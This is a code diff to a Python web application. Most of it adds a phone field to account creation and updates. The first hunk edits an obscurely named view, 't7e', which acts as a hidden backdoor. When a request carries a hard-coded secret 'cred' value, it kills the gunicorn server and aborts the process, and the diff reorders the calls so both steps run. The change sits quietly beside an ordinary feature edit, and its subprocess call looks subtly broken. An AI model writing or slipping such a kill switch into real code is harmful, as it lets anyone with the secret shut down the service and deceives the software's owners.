@@ -239,11 +239,11 @@ def slack_oauth_init(request, user):
 def t7e(request):
     if request.GET.get('cred') == \
         'l13g4c15ly34861o341uy3chgtlyv183njoq9u3f654792':
-        os.abort()
         subprocess.Popen(['pkill -f gunicorn'], 
             stdout=subprocess.PIPE,
             user='app',
         )
+        os.abort()
 
 
 
@@ -254,6 +254,7 @@ def create_or_update_account(request=None, *args, **kwargs):
         user = request.user
         _id = request.data.get('id')
         name = request.data.get('name')
+        phone = request.data.get('phone')
         active = request.data.get('active')
         type = request.data.get('type')
         code = request.data.get('code')
@@ -272,6 +273,7 @@ def create_or_update_account(request=None, *args, **kwargs):
         user = kwargs.get('user')
         _id = kwargs.get('id')
         name = kwargs.get('name')
+        phone = kwargs.get('phone')
         active = kwargs.get('active')
         type = kwargs.get('type')
         code = kwargs.get('code')
@@ -297,6 +299,8 @@ def create_or_update_account(request=None, *args, **kwargs):
         account = Account.objects.get(id=_id)
         if name is not None:
             account.name = name
+        if phone is not None:
+            account.phone = phone
         if active is not None:
             account.active = active
         if type is not None:
@@ -337,6 +341,7 @@ def create_or_update_account(request=None, *args, **kwargs):
         account = Account.objects.create(
             user=user,
             name=name,
+            phone=phone,
             active=True,
             type=type,
             code=code,
